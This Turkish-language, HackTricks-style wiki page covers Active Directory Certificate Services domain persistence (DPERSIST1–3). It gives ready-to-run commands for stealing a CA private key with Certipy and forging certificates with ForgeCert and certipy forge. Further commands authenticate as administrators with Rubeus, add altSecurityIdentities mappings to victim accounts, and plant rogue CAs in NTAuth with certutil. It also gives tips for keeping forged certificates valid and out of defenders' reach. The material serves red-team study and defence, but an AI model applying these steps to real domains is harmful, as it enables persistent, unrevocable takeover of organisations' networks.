# AD CS Etki Alanı Kalıcılığı

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresinde paylaşılan etki alanı kalıcılığı tekniklerinin bir özetidir. Daha fazla ayrıntı için belgeye bakın.**

## Çalınmış CA Sertifikaları ile Sertifika Sahteleme - DPERSIST1

Bir sertifikanın CA sertifikası olduğunu nasıl anlarsınız?

Bir sertifikanın CA sertifikası olduğu, aşağıdaki koşullar sağlanıyorsa anlaşılır:

- Sertifika CA sunucusunda saklanır ve özel anahtarı makinenin DPAPI'si tarafından korunur veya işletim sistemi destekliyorsa TPM/HSM gibi donanım tarafından korunur.
- Sertifikanın Issuer ve Subject alanlarının her ikisi de CA'nın distinguished name'i ile eşleşir.
- CA sertifikalarında yalnızca "CA Version" uzantısı bulunur.
- Sertifikada Extended Key Usage (EKU) alanları yoktur.

Bu sertifikanın özel anahtarını çıkarmak için CA sunucusundaki `certsrv.msc` aracı, yerleşik GUI üzerinden desteklenen yöntemdir. Yine de, bu sertifika sistemde saklanan diğer sertifikalardan farklı değildir; bu yüzden [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler kullanılarak da çıkarılabilir.

Sertifika ve özel anahtar ayrıca Certipy kullanılarak şu komutla elde edilebilir:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA sertifikası ile `.pfx` formatındaki özel anahtarını ele geçirdikten sonra, [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar geçerli sertifikalar oluşturmak için kullanılabilir:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Sertifika sahtelemesi hedeflenen kullanıcının Active Directory'de aktif ve kimlik doğrulaması yapabilir durumda olması gerekir; aksi takdirde işlem başarılı olmaz. krbtgt gibi özel hesaplar için sertifika sahteleme etkisizdir.

Bu sahte sertifika belirtilen bitiş tarihine kadar **geçerli** olacaktır ve **kök CA sertifikası geçerli olduğu sürece** (genellikle 5 ile **10+ yıl** arası) geçerlidir. Ayrıca **makineler** için de geçerlidir, bu nedenle **S4U2Self** ile birleştiğinde bir saldırgan **CA sertifikası geçerli olduğu sürece herhangi bir etki alanı makinesinde kalıcılığı sürdürebilir**.\ Ayrıca, bu yöntemle oluşturulan **sertifikalar** CA bunlardan haberdar olmadığından **iptal edilemez**.

### Güçlü Sertifika Eşleme Zorlaması (2025+) altında çalışma

11 Şubat 2025'ten beri (KB5014754 dağıtımından sonra), domain denetleyicileri sertifika eşlemeleri için varsayılan olarak **Full Enforcement** durumundadır. Pratikte bu, sahte sertifikalarınızın ya:

- Hedef hesaba güçlü bir bağlama içermesi (örneğin, SID güvenlik uzantısı), veya
- Hedef nesnenin `altSecurityIdentities` özniteliğinde güçlü, açık bir eşleme ile eşleştirilmiş olması gerektiği anlamına gelir.

Kalıcılık için güvenilir bir yaklaşım, çalınmış Enterprise CA'ya zincirlenmiş sahte bir sertifika düzenlemek ve ardından kurban principal'e güçlü, açık bir eşleme eklemektir:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notlar
- Eğer SID security extension'ı içeren sahte sertifikalar oluşturabiliyorsanız, bunlar Full Enforcement altında bile örtük olarak eşlenecektir. Aksi halde, açık ve güçlü eşlemeleri tercih edin. Açık eşleştirmeler hakkında daha fazla bilgi için [account-persistence](account-persistence.md) sayfasına bakın.
- İptal (revocation) burada savunmacılara yardımcı olmaz: sahte sertifikalar CA veritabanında bilinmez olduğu için iptal edilemez.

## Kötü Amaçlı CA Sertifikalarına Güvenme - DPERSIST2

`NTAuthCertificates` nesnesi, Active Directory (AD) tarafından kullanılan `cacertificate` özniteliği içinde bir veya daha fazla **CA certificates** içerecek şekilde tanımlanmıştır. **domain controller** tarafından yapılan doğrulama işlemi, kimlik doğrulayan **certificate**'ın Issuer alanında belirtilen **CA specified** ile eşleşen bir giriş için `NTAuthCertificates` nesnesini kontrol etmeyi içerir. Eşleşme bulunursa kimlik doğrulama devam eder.

Bir saldırgan, bu AD nesnesi üzerinde kontrole sahipse `NTAuthCertificates` nesnesine self-signed bir CA sertifikası ekleyebilir. Normalde bu nesneyi değiştirme izni yalnızca **Enterprise Admin** grubunun üyeleri ile birlikte **Domain Admins** veya **Administrators**'ın **forest root’s domain** içindeki üyelerine verilir. `NTAuthCertificates` nesnesini `certutil.exe` ile `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` komutunu kullanarak veya [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) aracını kullanarak düzenleyebilirler.

Bu teknik için faydalı ek komutlar:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Bu yetenek, ForgeCert ile dinamik olarak sertifika üretmeyi içeren daha önce açıklanan yöntemle birlikte kullanıldığında özellikle önemlidir.

> 2025 sonrası eşleme hususları: NTAuth içine rogue CA yerleştirmek sadece düzenleyen CA'ya güven oluşturur. DC'ler Full Enforcement modundayken yaprak (leaf) sertifikaları oturum açma için kullanmak için, yaprak ya SID güvenlik uzantısını içermeli ya da hedef nesnede güçlü bir açık eşleme olmalıdır (örneğin, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

AD CS bileşenlerinin security descriptor değişiklikleriyle elde edilebilecek **persistence** fırsatları bol miktarda vardır. "[Domain Escalation](domain-escalation.md)" bölümünde tanımlanan değişiklikler, yükseltilmiş erişime sahip bir saldırgan tarafından kötü amaçlı şekilde uygulanabilir. Buna "control rights" eklenmesi (ör. WriteOwner/WriteDACL/etc.) gibi hassas bileşenlere yetki verme dahildir; örneğin:

- CA sunucusunun AD bilgisayar nesnesi
- CA sunucusunun RPC/DCOM servisi
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` içindeki herhangi bir alt AD nesnesi veya container (örneğin, Certificate Templates container, Certification Authorities container, NTAuthCertificates nesnesi vb.)
- Varsayılan veya kuruluş tarafından AD CS'yi kontrol etme hakları devredilmiş AD grupları (ör. yerleşik Cert Publishers grubu ve üyeleri)

Kötü amaçlı bir uygulama örneği, domain içinde yükseltilmiş izne sahip bir saldırganın varsayılan `User` sertifika şablonuna `WriteOwner` iznini eklemesi ve bu hakkın sahibi olarak kendisini atamasıdır. Bunu istismar etmek için saldırgan önce `User` şablonunun sahipliğini kendisine geçirir. Ardından şablonda `mspki-certificate-name-flag` 1 olarak ayarlanır ve `ENROLLEE_SUPPLIES_SUBJECT` etkinleştirilir; bu, istekte bulunan kullanıcının bir Subject Alternative Name sağlamasına izin verir. Sonrasında saldırgan şablonu kullanarak enroll edebilir, alternatif ad olarak bir domain administrator adını seçebilir ve elde ettiği sertifikayı DA olarak kimlik doğrulama için kullanabilir.

Uzun vadeli domain persistence için saldırganların ayarlayabileceği pratik kontroller (tam ayrıntılar ve tespit için bakınız {{#ref}}domain-escalation.md{{#endref}}):

- İstemcilerden SAN kabul eden CA politika flag'leri (ör. `EDITF_ATTRIBUTESUBJECTALTNAME2`'nin etkinleştirilmesi). Bu, ESC1-benzeri yolların istismar edilebilir kalmasını sağlar.
- Kimlik doğrulama yapabilen sertifika verilmesine izin veren Template DACL veya ayarları (ör. Client Authentication EKU eklemek, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`'i etkinleştirmek).
- Savunucular temizleme yapmaya çalışırsa rogue issuer'ları sürekli yeniden tanıtmak için `NTAuthCertificates` nesnesini veya CA container'larını kontrol etme.

> [!TIP]
> KB5014754 sonrası sertleştirilmiş ortamlarda, bu yanlış yapılandırmaları açık ve güçlü eşlemelerle (`altSecurityIdentities`) eşleştirmek, DC'ler güçlü eşlemeyi zorladığında bile verdiğiniz veya sahtelediğiniz sertifikaların kullanılabilir kalmasını sağlar.

## Referanslar

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
